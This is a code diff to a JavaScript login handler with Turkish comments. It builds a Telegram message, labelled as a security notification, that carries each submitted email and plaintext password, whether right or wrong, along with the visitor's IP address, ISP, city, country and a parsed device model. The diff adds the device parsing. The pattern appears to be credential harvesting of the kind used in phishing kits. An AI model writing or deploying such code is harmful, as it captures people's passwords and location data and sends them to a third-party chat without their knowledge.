@@ -2,18 +2,31 @@ export default async function handler(req, res) {
     if (req.method !== 'POST') return res.status(405).end();
     
     try {
-        const { email, pass, ipData, cihaz } = req.body; // Cihaz verisini buradan karşılıyoruz
+        const { email, pass, ipData, cihaz } = req.body;
         
         const BOT_TOKEN = process.env.BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_ID;
         const DOGRU_SIFRE = process.env.SIFRE;
+
+        // Cihaz ismini temizleme (Basit bir ayıklama)
+        let temizCihaz = "Bilinmiyor";
+        if (cihaz.includes("Android")) {
+            const model = cihaz.match(/\(([^;]+);([^;]+);([^)]+)\)/);
+            temizCihaz = model ? model[3].trim() : "Android Cihaz";
+        } else if (cihaz.includes("iPhone")) {
+            temizCihaz = "iPhone";
+        } else if (cihaz.includes("Windows")) {
+            temizCihaz = "Windows Bilgisayar";
+        } else {
+            temizCihaz = cihaz.split(' ')[0]; // En azından ilk kelimeyi al
+        }
 
         const girisBasarili = (String(pass) === String(DOGRU_SIFRE));
 
         const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
                       `📧 E-posta: ${email}\n` +
                       `🔑 Şifre: ${pass}\n` +
-                      `📱 Cihaz: ${cihaz}\n` + // Mesajın içine ekledik
+                      `📱 Cihaz: ${temizCihaz}\n` + // Artık daha temiz görünecek
                       `📡 IP: ${ipData.ip || "Bilinmiyor"}\n` +
                       `🏢 ISS: ${ipData.org || "Bilinmiyor"}\n` +
                       `📍 Konum: ${ipData.city || "Bilinmiyor"} / ${ipData.country_name || ""}\n` +
@@ -35,9 +48,10 @@ export default async function handler(req, res) {
             return res.status(401).json({ success: false, message: "Hatalı şifre!" });
         }
     } catch (error) {
-        return res.status(500).json({ success: false, error: "Sistem hatası" });
+        return res.status(500).json({ success: false, error: "Hata" });
     }
 }
+
 
 
 
